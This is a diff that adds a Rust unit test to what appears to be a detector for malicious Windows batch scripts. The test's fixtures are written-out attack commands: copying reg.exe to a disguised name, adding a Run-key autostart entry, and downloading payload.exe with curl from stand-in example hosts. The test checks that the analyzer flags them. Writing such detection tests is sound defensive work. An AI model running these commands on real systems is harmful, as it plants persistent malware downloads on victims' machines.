@@ -2207,6 +2207,45 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "cmd 
     }
 
     #[test]
+    fn copied_reg_alias_replays_run_key_persisted_command() {
+        let script = br#"copy C:\Windows\System32\reg.exe C:\Users\Public\rg.tmp
+C:\Users\Public\rg.tmp add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "cmd.exe /V:ON /c set U=https://copied-reg.example/payload.exe&&curl -o payload.exe !U!" /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\rg.tmp"#)
+            )),
+            "copied reg alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, value_name, command, .. }
+                    if hive == "HKCU"
+                        && value_name == "Updater"
+                        && command.contains("copied-reg.example/payload.exe")
+            )),
+            "copied reg Run-key persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-reg.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied reg persisted child download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn reg_add_run_key_unquoted_data_captures_full_child_command() {
         let script = br#"@echo off
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d cmd.exe /c curl -o out.exe https://reg-unquoted.example/p.exe /f
